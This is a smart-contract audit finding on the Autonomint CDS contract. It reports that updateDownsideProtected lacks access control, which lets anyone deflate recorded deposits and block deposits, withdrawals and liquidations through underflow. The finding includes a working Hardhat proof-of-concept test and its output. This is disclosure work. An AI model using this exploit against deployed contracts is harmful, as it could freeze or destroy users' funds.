# [H-5] Lack of access control on `CDS::updateDownsideProtected` function artificially reduces `totalCdsDepositedAmount`

### Summary

The `CDS::updateDownsideProtected` function updates the value of `downsideProtected` that is used inside the `CDS::withdraw` and `CDS::deposit`.

During deposits and withdrawals, the `_updateCurrentTotalCdsDepositedAmount()` function is called which checks if `downsideProtected > 0` before deducting the `downsideProtected` value from `totalCdsDepositedAmount` and from `totalCdsDepositedAmountWithOptionFees`.

```javascript
    function _updateCurrentTotalCdsDepositedAmount() private {
        if (downsideProtected > 0) {
            totalCdsDepositedAmount -= downsideProtected;
            totalCdsDepositedAmountWithOptionFees -= downsideProtected;
            downsideProtected = 0;
        }
    }
```
Since the [function](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L829) has no access controls, anyone can set `downsideProtected ` to an arbitrary value.

```javascript
    //@audit lack of access controls modifiers
    function updateDownsideProtected(uint128 downsideProtectedAmount) external {
        downsideProtected += downsideProtectedAmount;
    }
```

Since the `downsideProtected` value is subtracted from `totalCdsDepositedAmount` and `totalCdsDepositedAmountWithOptionFees ` within the `CDS::_updateCurrentTotalCdsDepositedAmount` function a user can artificially reduce the perceived amount of funds deposited into the `CDS` contract.

This will lead to **ratio miscalculations** in the `Borrowing::_calculateRatio` and `BorrowLib::calculateRatio` functions because these two functions rely on the accuracy of `totalCdsDepositedAmount` to determine borrowing capacities and collateral ratios. An inflated `downsideProtected` will lead to **underestimation of deposits** because the protocol perceives fewer deposits than actual, skewing ratios downward.

This can also cause a permanent DOS of the `CDS::deposit` and `CDS::withdrawal` functions. A user can set `downsideProtected ` to `type(uint128).max` leading to underflow during deposits and withdrawals when `_updateCurrentTotalCdsDepositedAmount()` is called. This will cause all `deposit/withdraw` transactions to revert.

This issue can also lead to unexpected liquidation behaviors because the protocol **underestimates deposits**. Those miscalculations could trigger unexpected liquidations, destabilizing user positions, incorrect interest calculations, or if `downsideProtected` is a very large amount it can also prevent liquidations from happening, because calculations will underflow.


### Root Cause

Lack of access controls on the `CDS::updateDownsideProtected` function.

### Internal pre-conditions

### External pre-conditions

### Attack Path

### Impact

-  Underestimation of deposits because the protocol perceives fewer deposits than actual, skewing ratios downward.

- DOS of `CDS::deposit` and `CDS::withdrawal` functions. A user can set `downsideProtected ` to `type(uint128).max` leading to underflow during deposits and withdrawals when `_updateCurrentTotalCdsDepositedAmount()` is called. This will cause all `deposit/withdraw` transactions to revert.

- Potential for unexpected liquidation behavior

- DOS of the `liquidation` functionality altogether due to underflow during `liquidation` calculations. This will prevent users from being liquidated.

```javascript
//these will be negative at this point and function calls will revert
cds.updateTotalCdsDepositedAmount(cdsAmountToGetFromThisChain);
cds.updateTotalCdsDepositedAmountWithOptionFees(cdsAmountToGetFromThisChain);
cds.updateTotalAvailableLiquidationAmount(cdsAmountToGetFromThisChain);
```

- Potential loss of funds for users either through liquidations or if a user deposited and then another user sets `downsideProtected` to `type(uint128).max` then they are unable to withdraw their funds.

### PoC

Put the following test inside `BorrowingTest.ts` file

```javascript
    it.only("Should artificially decrease `totalCdsDepositedAmount` by inflating `downsideProtected`", async function () {
      const { CDSContractA, TokenA, usdtA, globalVariablesA } = await loadFixture(deployer);

      //mint 20k USDT to user1
      await usdtA.mint(user1.getAddress(), 20000000000);
      await usdtA.connect(user1).approve(CDSContractA.getAddress(), 20000000000);

      const options = Options.newOptions().addExecutorLzReceiveOption(400000, 0).toHex().toString();

      let nativeFee = 0;
      [nativeFee] = await globalVariablesA.quote(1, 0, options, false);

      //deposit 20k USDT into CDS
      await CDSContractA.connect(user1).deposit(20000000000, 0, true, 10000000000, 100000, {
        value: nativeFee.toString(),
      });

      let depositedAmount1 = await CDSContractA.totalCdsDepositedAmount();
      console.log("Deposited amount after first deposits is:", depositedAmount1);

      //mint 20k USDA and deposit into CDS
      await TokenA.mint(user1.getAddress(), 20000000000);
      await TokenA.connect(user1).approve(CDSContractA.getAddress(), 20000000000);

      await CDSContractA.connect(user1).deposit(0, 20000000000, true, 20000000000, 100000, {
        value: nativeFee.toString(),
      });
      expect(await CDSContractA.totalCdsDepositedAmount()).to.be.equal(40000000000);

      let depositedAmount2 = await CDSContractA.totalCdsDepositedAmount();
      console.log("Deposited amount after first 2 legit deposits is:", depositedAmount2);

      //artificially inflate downsideProtected by 50k
      await CDSContractA.connect(user2).updateDownsideProtected(50000000000);

      //mint another 20k USDA and deposit into CDS
      await TokenA.mint(user1.getAddress(), 20000000000);
      await TokenA.connect(user1).approve(CDSContractA.getAddress(), 20000000000);

      await CDSContractA.connect(user1).deposit(0, 20000000000, true, 20000000000, 100000, {
        value: nativeFee.toString(),
      });

      let depositedAmount3 = await CDSContractA.totalCdsDepositedAmount();
      console.log(
        "Deposited amount should've been 60000000000 (60K) after the 3rd deposit, but it's actually:",
        depositedAmount3
      );
    });
```

Test output

```javascript
Deposited amount after first deposits is: 20000000000n
Deposited amount after first 2 legit deposits is: 40000000000n
Deposited amount should've been 60000000000 (60K) after the 3rd deposit, but it's actually: 10000000000n
  âœ” Should artificially decrease `totalCdsDepositedAmount` by inflating `downsideProtected` (32836ms)

  1 passing (33s)
```
`totalCdsDepositedAmount` was artificially reduced by 50K, although users deposited 60K.

### Mitigation

Add access controls to the `updateDownsideProtected` function.
